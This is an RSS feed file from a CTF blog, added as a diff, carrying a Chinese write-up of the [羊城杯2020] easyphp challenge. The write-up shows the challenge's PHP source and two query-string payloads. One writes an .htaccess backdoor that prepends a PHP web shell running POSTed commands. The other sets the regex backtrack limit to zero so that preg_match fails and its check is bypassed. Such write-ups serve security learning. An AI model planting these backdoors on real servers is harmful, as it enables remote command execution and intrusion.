@@ -1,0 +1,149 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;通过php_value来设置preg_macth正则回溯次数&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Mon, 29 Jul 2024 22:20:52 +0800</pubDate>
+        <lastBuildDate>Mon, 29 Jul 2024 22:20:52 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <category>./htaccess文件上传</category>
+        <category>php未解析</category>
+        <category>利用环境变量构造bash命令</category>
+        <category>利用.htaccess构成后门</category>
+        <category>通过php_value来设置preg_macth正则回溯次数</category>
+        <category>java反序列化</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/07/29/ISITDTU2019-EasyPHP/</guid>
+            <title>[羊城杯2020]easyphp</title>
+            <link>http://odiws.github.io/2024/07/29/ISITDTU2019-EasyPHP/</link>
+            <category>利用.htaccess构成后门</category>
+            <category>通过php_value来设置preg_macth正则回溯次数</category>
+            <pubDate>Mon, 29 Jul 2024 22:20:52 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;羊城杯2020easyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#羊城杯2020easyphp&#34;&gt;#&lt;/a&gt; [羊城杯 2020] easyphp&lt;/h2&gt;
+&lt;p&gt;和 [XNUCA2019Qualifier] EasyPHP 基本一样，唯一的区别就是少了 include_once 导致没办法通过 error_log 来做，预期解应该就是那道题的非预期。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; &amp;lt;?php
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) &amp;#123;
+        if(is_file($file))&amp;#123;
+            if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
+                unlink($file);
+            &amp;#125;
+        &amp;#125;
+    &amp;#125;
+    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) &amp;#123;
+        highlight_file(__FILE__);
+        die();
+    &amp;#125;
+    $content = $_GET[&#39;content&#39;];
+    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) &amp;#123;
+        echo &amp;quot;Hacker&amp;quot;;
+        die();
+    &amp;#125;
+    $filename = $_GET[&#39;filename&#39;];
+    if(preg_match(&amp;quot;/[^a-z\.]/&amp;quot;, $filename) == 1) &amp;#123;
+        echo &amp;quot;Hacker&amp;quot;;
+        die();
+    &amp;#125;
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) &amp;#123;
+        if(is_file($file))&amp;#123;
+            if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
+                unlink($file);
+            &amp;#125;
+        &amp;#125;
+    &amp;#125;
+    file_put_contents($filename, $content . &amp;quot;\nHello, world&amp;quot;);
+?&amp;gt; 
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;文件包含，其中文件内容不能有&lt;strong&gt; on|html|type|flag|upload|file&lt;/strong&gt; 关键字，文件名只能有字母和点，且每次访问都会删除当前目录除 index.php 之外的文件。&lt;/p&gt;
+&lt;p&gt;写个一句话，发现没有被解析，可能是 php 解析配置 &lt;code&gt;php_flag engine&lt;/code&gt;  关闭了。配置的问题还是要回归配置文件，虽然主配置文件中关闭了 php 解析，但.htaccess 优先度高于主配置文件，因此我们可以使用.htaccess 执行 php 代码。&lt;/p&gt;
+&lt;h3 id=&#34;法一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#法一&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyNjb250ZW50czolRTYlQjMlOTUlRTQlQjglODA=&#34;&gt;法一&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;利用.htaccess 构成后门&lt;/strong&gt;，payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?filename=.htaccess&amp;amp;content=php_value%20auto_prepend_fi\%0ale%20&amp;quot;.htaccess&amp;quot;%0a%23%20&amp;lt;?php system($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;\
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;法二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#法二&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyNjb250ZW50czolRTYlQjMlOTUlRTQlQkElOEM=&#34;&gt;法二&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;通过 php_value 来设置 preg_macth 正则回溯次数&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?filename=.htaccess&amp;amp;content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使 preg_match 返回 False，继而绕过了正则判断，然后的过程由于源码没有使用 include，所以应该还是利用.htaccess 写入 php 代码自包含吧，那和前一种方法差不多 (自认为)。&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyMlRTYlQjMlOTUlRTQlQjglODA=&#34;&gt;https://tyskill.github.io/posts/ycb2020/# 法一&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
